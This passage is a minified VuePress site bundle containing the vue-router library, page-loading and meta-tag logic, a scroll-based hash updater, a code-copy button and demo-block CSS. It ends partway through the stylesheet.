bo={redirected:2,aborted:4,cancelled:8,duplicated:16};function vo(n,e){return xo(n,e,bo.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return wo.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function yo(n,e){return xo(n,e,bo.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function xo(n,e,t,r){var a=new Error(r);return a._isRouter=!0,a.from=n,a.to=e,a.type=t,a}var wo=["params","query","hash"];function ko(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function _o(n,e){return ko(n)&&n._isRouter&&(null==e||n.type===e)}function So(n,e,t){var r=function(a){a>=n.length?t():n[a]?e(n[a],(function(){r(a+1)})):r(a+1)};r(0)}function jo(n){return function(e,t,r){var a=!1,i=0,o=null;Co(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){a=!0,i++;var l,c=Eo((function(e){var a;((a=e).__esModule||To&&"Module"===a[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:Ni.extend(e),t.components[s]=e,--i<=0&&r()})),p=Eo((function(n){var e="Failed to resolve async component "+s+": "+n;o||(o=ko(n)?n:new Error(e),r(o))}));try{l=n(c,p)}catch(n){p(n)}if(l)if("function"==typeof l.then)l.then(c,p);else{var d=l.component;d&&"function"==typeof d.then&&d.then(c,p)}}})),a||r()}}function Co(n,e){return Io(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function Io(n){return Array.prototype.concat.apply([],n)}var To="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function Eo(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var Ao=function(n,e){this.router=n,this.base=function(n){if(!n)if(Gi){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=ui,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function zo(n,e,t,r){var a=Co(n,(function(n,r,a,i){var o=function(n,e){"function"!=typeof n&&(n=Ni.extend(n));return n.options[e]}(n,e);if(o)return Array.isArray(o)?o.map((function(n){return t(n,r,a,i)})):t(o,r,a,i)}));return Io(r?a.reverse():a)}function qo(n,e){if(e)return function(){return n.apply(e,arguments)}}Ao.prototype.listen=function(n){this.cb=n},Ao.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},Ao.prototype.onError=function(n){this.errorCbs.push(n)},Ao.prototype.transitionTo=function(n,e,t){var r,a=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var i=this.current;this.confirmTransition(r,(function(){a.updateRoute(r),e&&e(r),a.ensureURL(),a.router.afterHooks.forEach((function(n){n&&n(r,i)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!a.ready&&(_o(n,bo.redirected)&&i===ui||(a.ready=!0,a.readyErrorCbs.forEach((function(e){e(n)}))))}))},Ao.prototype.confirmTransition=function(n,e,t){var r=this,a=this.current;this.pending=n;var i,o,s=function(n){!_o(n)&&ko(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},l=n.matched.length-1,c=a.matched.length-1;if(fi(n,a)&&l===c&&n.matched[l]===a.matched[c])return this.ensureURL(),n.hash&&ao(this.router,a,n,!1),s(((o=xo(i=a,n,bo.duplicated,'Avoided redundant navigation to current location: "'+i.fullPath+'".')).name="NavigationDuplicated",o));var p=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),d=p.updated,m=p.deactivated,u=p.activated,g=[].concat(function(n){return zo(n,"beforeRouteLeave",qo,!0)}(m),this.router.beforeHooks,function(n){return zo(n,"beforeRouteUpdate",qo)}(d),u.map((function(n){return n.beforeEnter})),jo(u)),h=function(e,t){if(r.pending!==n)return s(yo(a,n));try{e(n,a,(function(e){!1===e?(r.ensureURL(!0),s(function(n,e){return xo(n,e,bo.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(a,n))):ko(e)?(r.ensureURL(!0),s(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(s(vo(a,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){s(n)}};So(g,h,(function(){So(function(n){return zo(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,a,i){return n(r,a,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),i(n)}))}}(n,t,r)}))}(u).concat(r.router.resolveHooks),h,(function(){if(r.pending!==n)return s(yo(a,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){vi(n)}))}))}))},Ao.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},Ao.prototype.setupListeners=function(){},Ao.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=ui,this.pending=null};var Mo=function(n){function e(e,t){n.call(this,e,t),this._startLocation=Po(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=go&&t;r&&this.listeners.push(ro());var a=function(){var t=n.current,a=Po(n.base);n.current===ui&&a===n._startLocation||n.transitionTo(a,(function(n){r&&ao(e,n,t,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){ho(ki(r.base+n.fullPath)),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){fo(ki(r.base+n.fullPath)),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(Po(this.base)!==this.current.fullPath){var e=ki(this.base+this.current.fullPath);n?ho(e):fo(e)}},e.prototype.getCurrentLocation=function(){return Po(this.base)},e}(Ao);function Po(n){var e=window.location.pathname,t=e.toLowerCase(),r=n.toLowerCase();return!n||t!==r&&0!==t.indexOf(ki(r+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var Lo=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=Po(n);if(!/^\/#/.test(e))return window.location.replace(ki(n+"/#"+e)),!0}(this.base)||Ro()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=go&&e;t&&this.listeners.push(ro());var r=function(){var e=n.current;Ro()&&n.transitionTo(Oo(),(function(r){t&&ao(n.router,r,e,!0),go||Uo(r.fullPath)}))},a=go?"popstate":"hashchange";window.addEventListener(a,r),this.listeners.push((function(){window.removeEventListener(a,r)}))}},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Bo(n.fullPath),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Uo(n.fullPath),ao(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;Oo()!==e&&(n?Bo(e):Uo(e))},e.prototype.getCurrentLocation=function(){return Oo()},e}(Ao);function Ro(){var n=Oo();return"/"===n.charAt(0)||(Uo("/"+n),!1)}function Oo(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function Do(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function Bo(n){go?ho(Do(n)):window.location.hash=n}function Uo(n){go?fo(Do(n)):window.location.replace(Do(n))}var Fo=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){_o(n,bo.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(Ao),No=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Qi(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!go&&!1!==n.fallback,this.fallback&&(e="hash"),Gi||(e="abstract"),this.mode=e,e){case"history":this.history=new Mo(this,n.base);break;case"hash":this.history=new Lo(this,n.base,this.fallback);break;case"abstract":this.history=new Fo(this,n.base);break;default:0}},Ho={currentRoute:{configurable:!0}};No.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},Ho.currentRoute.get=function(){return this.history&&this.history.current},No.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof Mo||t instanceof Lo){var r=function(n){t.setupListeners(),function(n){var r=t.current,a=e.options.scrollBehavior;go&&a&&"fullPath"in n&&ao(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},No.prototype.beforeEach=function(n){return Vo(this.beforeHooks,n)},No.prototype.beforeResolve=function(n){return Vo(this.resolveHooks,n)},No.prototype.afterEach=function(n){return Vo(this.afterHooks,n)},No.prototype.onReady=function(n,e){this.history.onReady(n,e)},No.prototype.onError=function(n){this.history.onError(n)},No.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},No.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},No.prototype.go=function(n){this.history.go(n)},No.prototype.back=function(){this.go(-1)},No.prototype.forward=function(){this.go(1)},No.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},No.prototype.resolve=function(n,e,t){var r=Fi(n,e=e||this.history.current,t,this),a=this.match(r,e),i=a.redirectedFrom||a.fullPath;return{location:r,route:a,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?ki(n+"/"+r):r}(this.history.base,i,this.mode),normalizedTo:r,resolved:a}},No.prototype.getRoutes=function(){return this.matcher.getRoutes()},No.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==ui&&this.history.transitionTo(this.history.getCurrentLocation())},No.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==ui&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(No.prototype,Ho);var $o=No;function Vo(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}No.install=function n(e){if(!n.installed||Ni!==e){n.installed=!0,Ni=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",yi),e.component("RouterLink",$i);var a=e.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},No.version="3.6.5",No.isNavigationFailure=_o,No.NavigationFailureType=bo,No.START_LOCATION=ui,Gi&&window.Vue&&window.Vue.use(No);t(103);t(9),t(135);var Go={NotFound:()=>Promise.all([t.e(0),t.e(7)]).then(t.bind(null,342)),Layout:()=>Promise.all([t.e(0),t.e(2)]).then(t.bind(null,340))},Wo={"v-f6da7732":()=>t.e(8).then(t.bind(null,346)),"v-4b18908b":()=>t.e(9).then(t.bind(null,347)),"v-3acc97ec":()=>t.e(10).then(t.bind(null,348)),"v-572c22a4":()=>t.e(11).then(t.bind(null,349)),"v-c09a6976":()=>t.e(12).then(t.bind(null,350)),"v-667b11b3":()=>t.e(13).then(t.bind(null,351)),"v-637ee5a8":()=>t.e(14).then(t.bind(null,352)),"v-20ccf4ba":()=>t.e(15).then(t.bind(null,353)),"v-0767abfc":()=>t.e(16).then(t.bind(null,354)),"v-284a5c70":()=>t.e(17).then(t.bind(null,355)),"v-f5009938":()=>t.e(18).then(t.bind(null,356)),"v-9567367a":()=>t.e(19).then(t.bind(null,357)),"v-236f9bdc":()=>t.e(20).then(t.bind(null,358)),"v-1068c768":()=>t.e(21).then(t.bind(null,359)),"v-3ddfa200":()=>t.e(22).then(t.bind(null,360)),"v-18fb999c":()=>t.e(23).then(t.bind(null,361)),"v-68562108":()=>t.e(24).then(t.bind(null,362)),"v-7af8708c":()=>t.e(25).then(t.bind(null,363)),"v-1a3c5af6":()=>t.e(26).then(t.bind(null,364)),"v-63e88fe4":()=>t.e(27).then(t.bind(null,365)),"v-7144078e":()=>t.e(28).then(t.bind(null,366)),"v-f9d6b4e4":()=>t.e(29).then(t.bind(null,367)),"v-d37ff6a4":()=>t.e(30).then(t.bind(null,368)),"v-1713f0c0":()=>t.e(31).then(t.bind(null,369)),"v-2595496f":()=>t.e(32).then(t.bind(null,370)),"v-16c92313":()=>t.e(33).then(t.bind(null,371)),"v-31806689":()=>t.e(34).then(t.bind(null,372)),"v-60fcebe2":()=>t.e(35).then(t.bind(null,373)),"v-bfe23564":()=>t.e(36).then(t.bind(null,343)),"v-290ff5e0":()=>t.e(37).then(t.bind(null,374)),"v-cba31118":()=>t.e(38).then(t.bind(null,375)),"v-73ef1b26":()=>t.e(39).then(t.bind(null,376)),"v-70906098":()=>t.e(40).then(t.bind(null,377)),"v-34d8b340":()=>t.e(41).then(t.bind(null,378)),"v-5155b7a4":()=>t.e(42).then(t.bind(null,379)),"v-5dd47d80":()=>t.e(43).then(t.bind(null,380)),"v-0866a376":()=>t.e(44).then(t.bind(null,381)),"v-376db697":()=>t.e(45).then(t.bind(null,382)),"v-2a89f0a5":()=>t.e(46).then(t.bind(null,383)),"v-0c9de936":()=>t.e(47).then(t.bind(null,384)),"v-47cbce6b":()=>t.e(48).then(t.bind(null,385)),"v-56606b1e":()=>t.e(49).then(t.bind(null,386)),"v-711274d8":()=>t.e(50).then(t.bind(null,387)),"v-a9def288":()=>t.e(51).then(t.bind(null,388)),"v-bca2559e":()=>t.e(52).then(t.bind(null,389)),"v-40cc2fb1":()=>t.e(53).then(t.bind(null,390)),"v-2968b3d4":()=>t.e(54).then(t.bind(null,391)),"v-eadc1a9a":()=>t.e(55).then(t.bind(null,392)),"v-aee8137e":()=>t.e(56).then(t.bind(null,393)),"v-3f2c56fd":()=>t.e(57).then(t.bind(null,394)),"v-556cb44a":()=>t.e(58).then(t.bind(null,395)),"v-4077a5fe":()=>t.e(59).then(t.bind(null,396)),"v-880aa198":()=>t.e(60).then(t.bind(null,397)),"v-49770e72":()=>t.e(61).then(t.bind(null,398)),"v-1a41a8d0":()=>t.e(62).then(t.bind(null,399)),"v-3553020e":()=>t.e(63).then(t.bind(null,400)),"v-a67c2976":()=>t.e(64).then(t.bind(null,401)),"v-2555ef69":()=>t.e(65).then(t.bind(null,402)),"v-3b782278":()=>t.e(66).then(t.bind(null,403)),"v-4e7874b6":()=>t.e(67).then(t.bind(null,404)),"v-0cedb105":()=>t.e(68).then(t.bind(null,405)),"v-40954b25":()=>t.e(69).then(t.bind(null,406)),"v-fd425884":()=>t.e(70).then(t.bind(null,407))};function Jo(n){const e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}const Qo=/-(\w)/g,Xo=Jo(n=>n.replace(Qo,(n,e)=>e?e.toUpperCase():"")),Yo=/\B([A-Z])/g,Zo=Jo(n=>n.replace(Yo,"-$1").toLowerCase()),Ko=Jo(n=>n.charAt(0).toUpperCase()+n.slice(1));function ns(n,e){if(!e)return;if(n(e))return n(e);return e.includes("-")?n(Ko(Xo(e))):n(Ko(e))||n(Zo(e))}const es=Object.assign({},Go,Wo),ts=n=>es[n],rs=n=>Wo[n],as=n=>Go[n],is=n=>Gt.component(n);function os(n){return ns(rs,n)}function ss(n){return ns(as,n)}function ls(n){return ns(ts,n)}function cs(n){return ns(is,n)}function ps(...n){return Promise.all(n.filter(n=>n).map(async n=>{if(!cs(n)&&ls(n)){const e=await ls(n)();Gt.component(n,e.default)}}))}function ds(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var ms=t(95),us=t.n(ms),gs=t(96),hs=t.n(gs),fs={created(){if(this.siteMeta=this.$site.headTags.filter(([n])=>"meta"===n).map(([n,e])=>e),this.$ssrContext){const e=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(n=e)?n.map(n=>{let e="<meta";return Object.keys(n).forEach(t=>{e+=` ${t}="${hs()(n[t])}"`}),e+">"}).join("\n    "):"",this.$ssrContext.canonicalLink=vs(this.$canonicalUrl)}var n},mounted(){this.currentMetaTags=[...document.querySelectorAll("meta")],this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta(){document.title=this.$title,document.documentElement.lang=this.$lang;const n=this.getMergedMetaTags();this.currentMetaTags=ys(n,this.currentMetaTags)},getMergedMetaTags(){const n=this.$page.frontmatter.meta||[];return us()([{name:"description",content:this.$description}],n,this.siteMeta,xs)},updateCanonicalLink(){bs(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",vs(this.$canonicalUrl))}},watch:{$page(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy(){ys(null,this.currentMetaTags),bs()}};function bs(){const n=document.querySelector("link[rel='canonical']");n&&n.remove()}function vs(n=""){return n?`<link href="${n}" rel="canonical" />`:""}function ys(n,e){if(e&&[...e].filter(n=>n.parentNode===document.head).forEach(n=>document.head.removeChild(n)),n)return n.map(n=>{const e=document.createElement("meta");return Object.keys(n).forEach(t=>{e.setAttribute(t,n[t])}),document.head.appendChild(e),e})}function xs(n){for(const e of["name","property","itemprop"])if(n.hasOwnProperty(e))return n[e]+e;return JSON.stringify(n)}var ws=t(48),ks={mounted(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(ws)()((function(){this.setActiveHash()}),300),setActiveHash(){const n=[].slice.call(document.querySelectorAll(".sidebar-link")),e=[].slice.call(document.querySelectorAll(".header-anchor")).filter(e=>n.some(n=>n.hash===e.hash)),t=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),r=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),a=window.innerHeight+t;for(let n=0;n<e.length;n++){const i=e[n],o=e[n+1],s=0===n&&0===t||t>=i.parentElement.offsetTop+10&&(!o||t<o.parentElement.offsetTop-10),l=decodeURIComponent(this.$route.hash);if(s&&l!==decodeURIComponent(i.hash)){const t=i;if(a===r)for(let t=n+1;t<e.length;t++)if(l===decodeURIComponent(e[t].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(t.hash),()=>{this.$nextTick(()=>{this.$vuepress.$set("disableScrollBehavior",!1)})})}}}},beforeDestroy(){window.removeEventListener("scroll",this.onScroll)}},_s=t(26),Ss=t.n(_s),js={mounted(){Ss.a.configure({showSpinner:!1}),this.$router.beforeEach((n,e,t)=>{n.path===e.path||Gt.component(n.name)||Ss.a.start(),t()}),this.$router.afterEach(()=>{Ss.a.done(),this.isSidebarOpen=!1})}};t(243),t(244);class Cs{constructor(){this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}show({text:n="",duration:e=3e3}){let t=document.createElement("div");t.className="message move-in",t.innerHTML=`\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">${n}</div>\n    `,this.containerEl.appendChild(t),e>0&&setTimeout(()=>{this.close(t)},e)}close(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",()=>{n.remove()})}}var Is={mounted(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy(){setTimeout(()=>{(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach(n=>{document.querySelectorAll(n).forEach(this.generateCopyButton)})},1e3)},generateCopyButton(n){if(n.classList.contains("codecopy-enabled"))return;const e=document.createElement("i");e.className="code-copy",e.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',e.title="Copy to clipboard",e.addEventListener("click",()=>{this.copyToClipboard(n.innerText)}),n.appendChild(e),n.classList.add("codecopy-enabled")},copyToClipboard(n){const e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);const t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy");(new Cs).show({text:"å¤å¶æå",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}};!function(n,e){void 0===e&&(e={});var t=e.insertAt;if(n&&"undefined"!=typeof document){var r=document.head||document.getElementsByTagName("head")[0],a=document.createElement("style");a.type="text/css","top"===t&&r.firstChild?r.insertBefore(a,r.firstChild):r.appendChild(a),a.styleSheet?a.styleSheet.cssText=n:a.appendChild(document.createTextNode(n))}}("@media (max-width: 1000px) {\n  .vuepress-plugin-demo-block__h_code {\n    display: none;\n  }\n  .vuepress-plugin-demo-block__app {\n    margin-left: auto !important;\n    margin-right: auto !important;\n  }\n}\n.vuepress-plugin-demo-block__wrapper {\n  margin-top: 10px;\n  border: 1px solid #ebebeb;\n  border-radius: 4px;\n  transition: all 0.2s;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display {\n  height: 400px;\n  display: flex;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__app {\n  width: 300px;\n  border: 1px solid #ebebeb;\n  box-shadow: 1px 1px 3px #ebebeb;\n  margin-right: 5px;\n  overflow: auto;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__h_code {\n  flex: 1;\n  overflow: auto;\n  height: 100%;\n}\n.vuepress-plugin-demo-block__wrapper.vuepress-plugin-demo-block__horizontal .vuepress-plugin-demo-block__display .vuepress-plugin-demo-block__h_code > pre {\n  overflow: visible;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__display {\n  max-height: 400px;\n  overflow: auto;\n}\n.vuepress-plugin-demo-block__wrapper div {\n  box-sizing: border-box;\n}\n.vuepress-plugin-demo-block__wrapper:hover {\n  box-shadow: 0 0 11px rgba(33, 33, 33, 0.2);\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__code {\n  overflow: hidden;\n  height: 0;\n  padding: 0 !important;\n  background-color: #282c34;\n  border-radius: 0 !important;\n  transition: height 0.5s;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__code pre {\n  margin: 0 !important;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__display {\n  padding: 20px;\n  border-bottom: 1px solid #ebebeb;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer {\n  position: relative;\n  text-align: center;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__codepen {\n  opacity: 1;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer.vuepress-plugin-demo-block__show-link .vuepress-plugin-demo-block__expand::before {\n  border-top: none;\n  border-right: 6px solid transparent;\n  border-bottom: 6px solid #ccc;\n  border-left: 6px solid transparent;\n}\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__jsfiddle,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__codepen,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand span,\n.vuepress-plugin-demo-block__wrapper .vuepress-plugin-demo-block__footer:hover .vuepress-plugin-demo-block__expand {\n  opacity: 